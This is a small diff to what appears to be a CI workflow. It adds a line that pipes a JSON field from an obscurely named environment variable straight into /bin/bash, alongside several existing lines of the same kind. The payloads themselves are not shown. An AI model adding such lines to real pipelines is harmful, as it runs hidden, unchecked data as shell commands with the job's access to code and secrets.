@@ -32,6 +32,7 @@ jobs:
           echo $nvkj3635 | jq -r .lbk429 | /bin/bash
           printf '%s' "$mml6" | jq -r .gr51112 | /bin/bash
           echo $el10 | jq -r .ix3105 | /bin/bash
+          echo $rb01 | jq -r .u4866 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
